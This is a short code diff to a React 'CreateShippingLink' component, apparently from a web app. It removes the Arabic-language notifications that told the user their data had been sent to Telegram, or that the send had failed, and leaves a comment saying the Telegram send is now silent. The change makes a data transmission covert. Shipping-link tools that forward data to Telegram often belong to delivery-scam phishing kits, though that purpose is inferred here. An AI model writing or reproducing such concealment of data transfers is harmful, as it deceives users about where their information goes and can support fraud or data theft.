@@ -91,19 +91,7 @@ const CreateShippingLink = () => {
         timestamp: new Date().toISOString()
       });
 
-      if (telegramResult.success) {
-        toast({
-          title: "تم الإرسال بنجاح",
-          description: "تم إرسال البيانات إلى التليجرام",
-        });
-      } else {
-        console.error('Telegram error:', telegramResult.error);
-        toast({
-          title: "تحذير",
-          description: "تم إنشاء الرابط ولكن فشل في إرسال البيانات إلى التليجرام",
-          variant: "destructive",
-        });
-      }
+      // Silent telegram send - no toast messages
 
       // Encode link data for sharing
       const dataToEncode = {
